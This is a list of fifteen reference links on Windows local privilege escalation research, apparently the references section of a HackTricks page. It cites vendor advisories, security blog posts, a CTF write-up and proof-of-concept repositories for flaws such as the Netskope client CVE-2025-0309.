- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
